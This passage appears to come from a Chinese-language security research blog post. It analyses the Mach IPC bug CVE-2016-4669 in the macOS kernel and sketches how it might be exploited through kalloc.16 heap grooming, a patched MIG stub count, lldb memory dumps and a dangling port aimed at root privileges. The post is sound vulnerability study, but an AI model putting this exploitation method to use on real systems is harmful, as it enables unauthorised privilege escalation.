    /*
    mach_port_destroy
            |
            |--->ipc_right_destroy
                        |
                        |--->ipc_port_destroy
                                    |
                                    |--->ipc_mqueue_destroy
                                                |
                                                |--->ipc_kmsg_reap_delayed
                                                              |
                                                              |--->ipc_kmsg_clean_body
    */
调用栈大致如上所示，最核心的逻辑在`ipc_kmsg_clean_body`函数里实现。
## 0x03 回到CVE-2016-4669
对CVE-2016-4669的POC和漏洞成因的分析在[这里](http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/)。
没有了解过这个漏洞的同学可以先了解一下。
经过对`IPC`模块一系列的漏洞的分析与学习，我尝试着对之前分析过的`CVE-2016-4669`这个漏洞写一写利用。
思路大致如下：
  * kalloc.16 的内存布局。
  * 触发漏洞，在内存中访问越界，对其他`port`调用`ipc_port_release_send`。创造`dangling port`。
  * 重用`port`，获得`root`权限。
### 3.1 kalloc.16内存布局
在正常的情况下，kalloc.16的某个`Page`中的内存布局如下图所示(更多关于内存布局的只是可以查看[这里](http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/))：
  * [a]标记出的就是`kalloc.16`这个`zone`中`free element`。
  * [b]是已经被使用的`element`，且16个字节都使用到了。
  * [c]是已经被使用的`element`，但是只用前面八个字节，所有后面8个字节是`0xdeadbeefdeadbeef`。
因为漏洞会越界访问，对下个`element`中的地址调用`ipc_port_release_send`，所以通过向一个很多的`stash
port`，发送同一个`target port`的`right`，在发送完成后再释放其中一部分得`stash
port`，在`kalloc.16`的`zone`中制造触发漏漏洞的时候使用的`free element`。
在构造完成后大致如下：
### 3.2 触发漏洞
这里要把`patch`的参数个数从1改成2。
    #if UseStaticTemplates
        InP->init_port_set = init_port_setTemplate;
        InP->init_port_set.address = (void *)(init_port_set);
        InP->init_port_set.count = 2;//1; // was init_port_setCnt;
    #else   /* UseStaticTemplates */
        InP->init_port_set.address = (void *)(init_port_set);
        InP->init_port_set.count = 2;//1; // was init_port_setCnt;
出发漏洞后，就可以看到内存布局。
简单的调试流程如下：
先找到`mach_ports_register`函数第一次调用`ipc_port_release_send`的地方，并下一个断点。
        0xffffff800b0e22aa : call   0xffffff800b1c1bd0        ; lck_mtx_unlock
        0xffffff800b0e22af : lea    rax, [r15 + 0x1]
        0xffffff800b0e22b3 : cmp    rax, 0x2
        0xffffff800b0e22b7 : jb     0xffffff800b0e22c1        ;  at ipc_tt.c:1096
        0xffffff800b0e22b9 : mov    rdi, r15
        0xffffff800b0e22bc : call   0xffffff800b0c98f0        ; ipc_port_release_send at ipc_port.c:1560
        0xffffff800b0e22c1 : lea    rax, [r13 + 0x1]
        0xffffff800b0e22c5 : cmp    rax, 0x2
        0xffffff800b0e22c9 : jb     0xffffff800b0e22d3        ;  at ipc_tt.c:1096
        0xffffff800b0e22cb : mov    rdi, r13
        0xffffff800b0e22ce : call   0xffffff800b0c98f0        ; ipc_port_release_send at ipc_port.c:1560
        0xffffff800b0e22d3 : lea    rax, [rbx + 0x1]
        0xffffff800b0e22d7 : cmp    rax, 0x2
        0xffffff800b0e22db : jb     0xffffff800b0e22e5        ;  at ipc_tt.c:1097
        0xffffff800b0e22dd : mov    rdi, rbx
        0xffffff800b0e22e0 : call   0xffffff800b0c98f0        ; ipc_port_release_send at ipc_port.c:1560
    (lldb) b *0xffffff800b0e22bc
    Breakpoint 1: where = kernel`mach_ports_register + 524 at ipc_tt.c:1097, address = 0xffffff800b0e22bc
然后执行`exp`程序，一般情况下是第二次命中断点时，`portsCnt=3`（第一次命中时`portsCnt=1`并不是我们的代码触发的，可以不管）。内存布局如下：
    (lldb) p/x memory
    (mach_port_array_t) $10 = 0xffffff80115cf9f0
    (lldb) memory read --format x --size 8 --count 50 memory-0x20
    [...]
    0xffffff80115cf9a0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cf9b0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cf9c0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cf9d0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cf9e0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cf9f0: 0xffffff8015f0b680 0x0000000000000000 **[p_self,NULL]**
    0xffffff80115cfa00: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cfa10: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]
    0xffffff80115cfa20: 0x0000000000000000 0xdeadbeefdeadbeef
    0xffffff80115cfa30: 0xffffff8013dee0e0 0x0000000000000000
    0xffffff80115cfa40: 0x0000000000000000 0xffffffff00000000
    0xffffff80115cfa50: 0xffffff8013dee0e0 0x0000000000000000
    0xffffff80115cfa60: 0xffffff8013dee0e0 0x0000000000000000
    0xffffff80115cfa70: 0xffffff8013dee0e0 0x0000000000000000
接着，`mach_ports_register`的逻辑就会越界将`0xffffff80115cfa00`处的`0xffffff8013dee0e0`拷到`task->itk_registered`中去。
    for (i = 0; i itk_registered[i];
          task->itk_registered[i] = ports[i];
          ports[i] = old;
        }
通过`lldb`查看`ports`的状态。
    p *(ipc_port_t)0xffffff8013dee0e0
    (ipc_port) $12 = {
      ip_object = {
        io_bits = 2147483648
        io_references = 4057
        io_lock_data = (interlock = 0x0000000000000000)
      }
      [...]
      ip_srights = 4056
    }
在第二次调用到`mach_ports_register`的时候，会对他们调用`ipc_port_release_send`。
    //第二次调用mach_ports_register函数时，ports中的数据变成了刚刚存储的
    for (i = 0; i < TASK_PORT_REGISTER_MAX; i++) 
          if (IP_VALID(ports[i]))
            ipc_port_release_send(ports[i]);
这个时候再观察`port`在内核中的状态，机会发现`ip_srights`和`io_references`都做了一次 **减一** 。
这个时候在释放掉所有的`stashed port`就将我们的`target port` 释放掉了。因为通过触发`bug`多释放了一次。
  * 通过`stashed port`创造了4096个`reference`，释放掉所有的`stashed port`就对`reference`做了4096次 **减一** ，通过触发bug 又多做了一次`release`，释放了一开始`mach_port_allocate`创建的`reference`。
  * `srights`与`reference`相同。
### 3.3 重用port
这一步在我的`EXP`里就是看脸了，成功率并不是很高，没有找到稳定的利用方法。就不多说什么了，从别的`EXP`里抄来的代码。
## 0x04 小结
到这里整个`MACH-IPC`相关的漏洞分析与学习就暂时告一段落了。
这篇分析日志，断断续续写了很久，可能思路有点不连贯，有什么问题欢迎大家一起探讨：）
* * *